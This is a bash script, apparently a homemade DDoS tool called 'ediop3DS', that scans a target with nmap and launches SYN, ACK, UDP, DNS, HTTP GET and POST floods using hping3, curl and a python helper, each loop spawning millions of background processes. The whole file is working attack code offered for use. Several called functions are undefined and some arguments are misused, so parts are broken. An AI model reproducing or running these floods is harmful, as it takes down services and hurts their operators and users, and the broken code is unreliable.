#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
    echo -e "  -F     Test firewall"
    echo -e "  -I    Send DNS Flood attack (requires root)"
    echo -e "  -T    Send HTTP Flood attack (no root)"
    echo -e "  -L    Perform HTTP POST Flood (no root)"
    echo -e "  -M    Send custom TCP packet flood (requires root)"
    echo -e "  -V    Perform SSL DDoS attack (requires root)"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Function to read user agents from file
read_user_agents() {
    if [ -f "user_agents.txt" ]; then
        mapfile -t user_agents < user_agents.txt
    else
        echo -e "${RED}[!] user_agents.txt not found! Please ensure it's in the same directory.${RESET}"
        exit 1
    fi
}

# Function to perform SYN flood with user agents efficiently
syn_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # Increase packet size for higher traffic volume
        python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" -s 2048 > /dev/null 2>&1 &
    done
    wait
}

# Function to perform ACK flood with user agents efficiently
ack_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # Use a larger packet size for higher traffic
        hping3 -A -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform UDP flood with user agents efficiently
udp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # Increase packet size for higher traffic
        hping3 --udp -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform DNS flood (additional DNS flood logic)
dns_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting DNS flood attack on $target${RESET}"
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # DNS flood logic (increase packet size)
        hping3 --udp -p 53 -a $target --dns -d 2048 $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform HTTP flood (sending HTTP GET requests)
http_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP flood attack on $target${RESET}"
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # Larger HTTP GET request size for higher traffic
        curl -s -X GET http://$target -H "User-Agent: RandomUA" --data "payload" > /dev/null 2>&1 &
    done
    wait
}

# Function to perform HTTP POST flood (sending POST requests)
post_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP POST flood attack on $target${RESET}"
    for ((i=0; i<7000000; i++)); do  # 7 million packets
        # Larger HTTP POST request size for higher traffic
        curl -s -X POST http://$target --data "payload" > /dev/null 2>&1 &
    done
    wait
}

# Main function to handle user input
while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:FITLVM" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) http_icmp_flood "$target";;
        r) retry_attack "$target";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) check_and_run_slowloris "$target";;
        t) attack_type="$OPTARG";;
        F) test_firewall "$target";;
        I) dns_flood "$target";;
        T) http_flood "$target";;
        L) post_flood "$target";;
        M) custom_tcp_flood "$target";;
        V) ssl_ddos "$target";;
        *) show_help;;
    esac
done
